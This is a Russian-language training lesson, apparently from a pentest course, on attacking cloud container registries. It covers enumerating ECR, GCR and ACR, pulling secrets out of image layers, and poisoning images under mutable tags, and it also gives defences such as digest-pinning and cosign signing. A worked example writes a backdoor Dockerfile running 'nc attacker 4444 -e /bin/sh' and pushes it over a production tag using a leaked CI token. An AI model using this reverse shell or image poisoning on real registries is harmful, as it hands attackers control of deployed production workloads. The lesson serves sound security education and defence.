---
id: cloud-artifact-registry
title: "Artifact registries: ECR, GCR, ACR и отравление образов"
category: cloud
parent: cloud-supply-chain
difficulty: hard
order: 1
tags: [cloud, ecr, gcr, acr, registry, images, supply-chain, poisoning]
prerequisites: [cloud-supply-chain, cloud-containers-docker]
useful_for:
  - "Атака на container registry"
  - "Отравление образов и supply chain"
  - "Пентест CI/CD и k8s"
estimated_minutes: 45
summary: "Как атаковать облачные container registries: открытые ECR/GCR/ACR, слабая аутентификация, отравление образов, теги mutable и pull-секреты. Пути к компрометации деплоя."
---

Container registry хранит образы, которые деплоятся в кластеры. Если атакующий может **записать** образ или подменить тег, он контролирует код в продакшене. Урок про обнаружение открытых registries, слабую аутентификацию и отравление образов.

## Как устроены облачные registries

| Registry | Облако | Эндпоинт |
|----------|--------|----------|
| ECR | AWS | `<acct>.dkr.ecr.<region>.amazonaws.com` |
| GCR/Artifact Registry | GCP | `gcr.io`, `<region>-docker.pkg.dev` |
| ACR | Azure | `<name>.azurecr.io` |
| Docker Hub | любой | `registry-1.docker.io` |

Аутентификация:

```bash
# ECR
aws ecr get-login-password | docker login --username AWS \
  --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
# GCR
gcloud auth configure-docker
# ACR
az acr login --name <name>
```

## Разведка registries

```bash
# ECR: список репозиториев и образов
aws ecr describe-repositories --query 'repositories[].repositoryUri'
aws ecr list-images --repository-name <repo>
aws ecr get-repository-policy --repository-name <repo>   # resource policy!

# GCR/Artifact Registry
gcloud artifacts repositories list
gcloud artifacts docker images list <location>-docker.pkg.dev/<proj>/<repo>

# ACR
az acr repository list --name <name>
az acr repository show-tags --name <name> --repository <repo>
```

Публичные registries: ECR может иметь resource policy с `Principal: "*"`; GCR/ACR — публичные репозитории. Проверяйте анонимный доступ:

```bash
# Анонимный pull (если публичный)
docker pull <registry>/<repo>:<tag>
skopeo inspect docker://<registry>/<repo>:<tag>
```

## Извлечение секретов из образов

Образы содержат слои с историей. Секреты — в `ENV`, файлах, `.git`.

```bash
# Скачать и распаковать образ
docker pull <registry>/<repo>:<tag>
docker save <registry>/<repo>:<tag> -o img.tar
mkdir img && tar -xf img.tar -C img
# Слои
ls img/*/layer.tar
# Искать секреты
for l in img/*/layer.tar; do tar -tf "$l" 2>/dev/null; done | grep -iE '\.env|\.npmrc|id_rsa|credentials'
# История (команды сборки, включая ARG/ENV с секретами)
docker history --no-trunc <registry>/<repo>:<tag>
```

```bash
# Прямой поиск секретов в слоях
tar -xf img.tar -C img
grep -rE 'AKIA[0-9A-Z]{16}|BEGIN (RSA|OPENSSH) PRIVATE KEY' img/ 2>/dev/null
```

## Отравление образов

Если есть **push**-права (или слабая аутентификация), можно подменить образ, который задеплоят.

```bash
# Тег mutable: перезапись существующего тега
docker pull <registry>/<repo>:latest
docker tag backdoor <registry>/<repo>:latest
docker push <registry>/<repo>:latest
# Теперь деплой подтянет backdoor
```

Опасные конфигурации:
- **Mutable tags** (`latest`) без digest-pinning — подмена тега не детектится.
- **Resource policy с push** для широкой группы.
- **CI push-токены** в открытом виде.
- **Pull secrets** кластера, дающие push.

```bash
# Деплой часто пинит по digest — проверяйте
kubectl get deploy -A -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.spec.template.spec.containers[*].image}{"\n"}{end}'
```

## Разобранный пример: ACR с push → backdoor в продакшене

**Дано:** найден ACR с открытым `az acr login` через утёкший токен CI.

1. Проверяем доступ:

```bash
az acr login --name <name>
az acr repository list --name <name>
az acr repository show-tags --name <name> --repository app
```

2. Собираем backdoor-образ и пушим под тем же тегом:

```bash
cat > Dockerfile <<'EOF'
FROM alpine
CMD ["/bin/sh","-c","nc attacker 4444 -e /bin/sh"]
EOF
docker build -t <name>.azurecr.io/app:latest .
docker push <name>.azurecr.io/app:latest
```

3. При следующем rollout кластера образ подхватится (если тег mutable). Получаем shell.

## Защита

- **Immutable tags** и **digest-pinning** в деплое (`image@sha256:...`).
- **Подпись образов** (cosign/Sigstore) и verify в admission controller.
- **Строгие resource policies** — никаких wildcard push.
- **Сканирование образов** (Trivy, Grype) в CI.
- **Не хранить секреты в слоях** — использовать build secrets (`--secret`).

## Частые ошибки

- **Считать registry только хранилищем.** Push = контроль деплоя.
- **Игнорировать digest.** Без pinning тег mutable и подменяем.
- **Не сканировать слои.** Секреты остаются в истории образа.
- **Забывать про resource policy ECR.** Она может открывать push.
- **Путать pull и push-права.** Читать может быть можно, писать — нет.
- **Не проверять pull secrets кластера.** Они дают доступ к registry.

## Что дальше / решение

- Есть анонимный pull → сканируйте образы на секреты.
- Есть push → отравляйте образ под mutable-тегом.
- Есть digest-pinning → ищите другой путь (CI, admission).
- Смежные уроки: `cloud-supply-chain`, `cloud-containers-docker`, `cloud-kubernetes-rbac`.

## Команды по провайдерам

```bash
# AWS ECR
aws ecr describe-repositories
aws ecr list-images --repository-name app
aws ecr get-login-password | docker login --username AWS --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
docker pull <acct>.dkr.ecr.<region>.amazonaws.com/app:latest
# GCP GCR/Artifact Registry
gcloud artifacts repositories list
gcloud artifacts docker images list <region>-docker.pkg.dev/<proj>/<repo>
# Azure ACR
az acr list -o table
az acr repository list --name myacr
az acr credential show --name myacr
```

## Секреты в слоях образов

```bash
docker save image:tag -o img.tar
tar xf img.tar
# перебрать слои
for l in */layer.tar; do tar tf "$l" | grep -iE 'env|secret|cred|\.pem|id_rsa'; done
```

Также `dive` показывает слои интерактивно, а `trufflehog docker`/`trivy image` ищут секреты автоматически.

## Отравление образов

Если есть push в registry, от которого зависит продакшен, можно подменить образ (тот же тег) с backdoor. Это supply-chain-атака: следующий деплой развернёт вредоносный код. Защита — immutable-теги, подпись (cosign/notary), admission-контроль проверки подписи.

## Практическое задание

Соберите образ с «секретом» в слое, выгрузите его через `docker save` и найдите секрет. Затем настройте подпись образа (cosign) и проверку при деплое. Это демонстрирует и утечку через слои, и защиту через подписи.

## Почему registry — цель

Registry связан с пайплайном: у кого push — тот контролирует, что задеплоится. Даже read-доступ ценен: образы содержат креды в слоях. Push-доступ — прямая supply-chain-атака. Поэтому права на registry (ECR `PutImage`, ACR `AcrPush`, GCR `storage.objectCreator`) следует считать привилегированными и защищать подписью образов.

## Чек-лист

1. Найти registry (ECR/GCR/ACR), проверить анонимный/низкопривилегированный доступ.
2. Перечислить репозитории и образы.
3. Скачать образ, распаковать слои, найти секреты.
4. Проверить push-права (есть ли возможность отравить образ).
5. Оценить, какой пайплайн/кластер потребляет образ.
6. Задокументировать цепочку и влияние.

## Immutable-теги и подпись

Mutable-тег (`latest`) можно перезаписать — это основа отравления. Immutable-теги и digest-ссылки (`image@sha256:...`) фиксируют артефакт. Подпись (cosign, notation) + admission-контроль, проверяющий подпись, не дают задеплоить неподписанный образ. Проверка:

```bash
cosign verify --key cosign.pub <registry>/<image>@sha256:...
cosign verify-attestation --type slsaprovenance <image>
```

Без подписи любой, кто имеет push, может внедрить backdoor в продакшен.

## Lifecycle-политики и удалённые образы

Registry хранит историю тегов и слои даже после «удаления» тега. Lifecycle-политика может удалять старые образы, но до этого они доступны. Проверьте `list-images --filter tagStatus=UNTAGGED` (ECR) — untagged-образы часто содержат старые версии с секретами. Это дешёвый источник утечек, который пропускают при аудите.

## Быстрая проверка registry

```bash
aws ecr describe-repositories
aws ecr list-images --repository-name app --filter tagStatus=UNTAGGED
gcloud artifacts repositories list
az acr repository list --name myacr
```

Untagged-образы часто содержат старые версии с секретами. Проверьте анонимный доступ и push-права — оба критичны.

## Квиз

```quiz
- question: "Почему mutable-тег (latest) опасен для supply chain?"
  options:
    - "Образ под тем же тегом можно подменить без изменения манифеста деплоя"
    - "Он ускоряет pull"
    - "Он шифрует образ"
    - "Он безвреден"
  answer: 0
  explanation: "Тег перезаписывается — деплой тянет новый образ."
- question: "Где в образе часто остаются секреты?"
  options:
    - "В слоях, ENV и истории сборки"
    - "В размере образа"
    - "В теге"
    - "В имени реестра"
  answer: 0
  explanation: "Слои и история содержат значения из сборки."
- question: "Что проверяют у ECR в первую очередь?"
  options:
    - "Repository resource policy на wildcard principal"
    - "Цвет консоли"
    - "Регион по умолчанию"
    - "Часовой пояс"
  answer: 0
  explanation: "Resource policy может открыть доступ наружу."
- question: "Как защититься от подмены образа в деплое?"
  options:
    - "Digest-pinning и подпись образов (cosign)"
    - "Использовать latest"
    - "Отключить сканирование"
    - "Публичный registry"
  answer: 0
  explanation: "Digest + подпись фиксируют конкретный образ."
- question: "Чем опасен утёкший push-токен registry?"
  options:
    - "Позволяет залить backdoor-образ под легитимным тегом"
    - "Только замедляет сборку"
    - "Меняет DNS"
    - "Он безвреден"
  answer: 0
  explanation: "Push = контроль того, что задеплоится."
```

## Где пригодится

- **Red team:** от registry к продакшену через отравление образа.
- **Пентест:** аудит registries, resource policies, digest-pinning.
- **CTF:** задачи с container registry.
- **Работа/DevSecOps:** immutable tags, подписи, сканирование, build secrets.
- **Дальше по дереву:** `cloud-supply-chain`, `cloud-containers-docker`.
